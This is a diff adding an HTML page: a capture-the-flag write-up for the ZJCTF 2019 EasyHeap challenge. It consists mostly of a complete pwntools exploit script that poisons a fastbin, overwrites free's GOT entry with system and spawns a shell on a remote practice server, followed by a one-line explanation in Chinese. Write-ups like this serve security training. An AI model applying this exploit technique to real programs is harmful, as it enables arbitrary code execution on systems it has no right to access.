@@ -1,0 +1,75 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>[ZJCTF 2019]EasyHeap</title>
+</head>
+<body>
+<b>[ZJCTF 2019]EasyHeap</b><br>
+<small>2025-03-20</small>
+<hr>
+<br><b><a href="#ZJCTF-2019-EasyHeap"></a>[ZJCTF 2019]EasyHeap</b><br>
+<blockquote>
+<p>  puts(“——————————–”);<br>  puts(“       Easy Heap Creator       “);<br>  puts(“——————————–”);<br>  puts(“ 1. Create a Heap               “);<br>  puts(“ 2. Edit a Heap                 “);<br>  puts(“ 3. Delete a Heap               “);<br>  puts(“ 4. Exit                        “);<br>  puts(“——————————–”);<br>  return printf(“Your choice :”);</p>
+</blockquote>
+<pre><code>from pwn import *
+context.os=&#x27;linux&#x27;
+context.arch=&#x27;amd64&#x27;
+context.log_level=&#x27;debug&#x27;
+elf = ELF(&quot;/home/rick/Downloads/easyheap/easyheap&quot;)
+p = remote(&quot;node5.buuoj.cn&quot;,29263)
+libc = ELF(&quot;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)
+def debug():
+    attach(p)
+    pause()
+
+def alloc(size,content):
+    p.recvuntil(&quot;Your choice :&quot;)
+    p.sendline(&#x27;1&#x27;)
+    p.recvuntil(&quot;Size of Heap : &quot;)
+    p.sendline(str(size))
+    p.recvuntil(&quot;Content of heap:&quot;)
+    p.sendline(content)
+
+def edit(idx, size, content):
+    p.recvuntil(&quot;Your choice :&quot;)
+    p.sendline(&#x27;2&#x27;)
+    p.recvuntil(&quot;Index :&quot;)
+    p.sendline(str(idx))
+    p.recvuntil(&quot;Size of Heap : &quot;)
+    p.sendline(str(size))
+    p.recvuntil(&quot;Content of heap : &quot;)
+    p.sendline(content)
+
+def free(idx):
+    p.recvuntil(&quot;Your choice :&quot;)
+    p.sendline(&#x27;3&#x27;)
+    p.recvuntil(&quot;Index :&quot;)
+    p.sendline(str(idx))
+
+bss_heaparray = 0x6020E0
+using_fake_chunk = bss_heaparray - 0x33
+alloc(0x60,b&quot;rick&quot;)
+alloc(0x60,b&quot;rick&quot;)
+alloc(0x60,b&quot;rick&quot;) #2
+
+free(2)
+payload = b&#x27;/bin/sh\x00&#x27; +b&#x27;A&#x27;*0x60 + p64(0x71) + p64(using_fake_chunk)
+edit(1,len(payload),payload)
+alloc(0x60,b&quot;rick&quot;)
+alloc(0x60,b&quot;rick&quot;) #alloc fake chunk
+payload=p64(0)*4+b&#x27;A&#x27;*0x3+p64(elf.got[&quot;free&quot;])
+
+edit(3,len(payload),payload)
+
+payload = p64(elf.plt[&quot;system&quot;])
+edit(0,len(payload),payload) # now modify free got
+free(1)
+
+p.interactive()</code></pre>
+
+<p>通过修改bss静态段的heaparray来使idx0变成free的got表 然后写入system的plt 随后free就执行</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
